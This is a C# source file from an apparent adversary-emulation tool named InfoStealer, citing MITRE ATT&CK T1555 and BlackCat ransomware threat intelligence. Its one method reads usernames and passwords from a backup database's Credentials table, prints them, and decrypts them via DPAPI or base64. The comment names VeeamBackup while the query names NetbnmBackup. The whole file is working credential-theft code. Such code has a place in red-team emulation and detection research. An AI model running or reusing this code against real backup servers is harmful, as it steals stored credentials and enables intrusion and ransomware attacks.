using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Data.SqlClient;


namespace InfoStealer
{
    internal class mssql
    {

        /*
         * Name: cred_query
         * parameters: SQLConnectionBuilder builder
         *  - builder: object to perform connection to MS-SQL database
         *  
         *  This method queries the Credentials table from the VeeamBackup database for username, password and description fields.
         *  Return: void, data is writen to stdout
	 *
	 *  MITRE ATT&CK Techniques:
	 *  	- T1555 Credentials from Password Stores
	 *
	 *  CTI:
	 *  	- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps
	 *
	 *  Other References: 
	 *  	- https://learn.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=dotnet-plat-ext-7.0
         */
        public static void cred_query(SqlConnectionStringBuilder builder, String dataType)
        {

            // Populate SQL connection string
            SqlConnection connection = new SqlConnection(builder.ConnectionString);
            Console.WriteLine(builder.ConnectionString);
            connection.Open();

            // Query string for NetbnmBackup table for creds
            String sql = "SELECT username,password,description from NetbnmBackup.dbo.Credentials";

            using (SqlCommand command = new SqlCommand(sql, connection))
            {
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read()) // while there's data from the SQL query print out the data
                    {
                        Console.WriteLine("{0}, {1}, {2}", reader.GetString(0), reader.GetString(1), reader.GetString(2));

                        if (dataType == "dpapi")
                        {
                            // decrypt DPAPI credenials
                            dpapi.DPAPI_decrypt(reader.GetString(1));
                        } else if (dataType == "base64")
                        {
                            // base64 decode password
                            byte[] data = Convert.FromBase64String(reader.GetString(1));
                            string decodedString = System.Text.Encoding.UTF8.GetString(data);
                            Console.WriteLine("Data: {0}", decodedString);
                        } else
                        {
                            Console.WriteLine("Unknown data type argument provided: {0}", dataType);
                        }
                        
                    }
                }
            }

            connection.Close();
        }   

    }
}
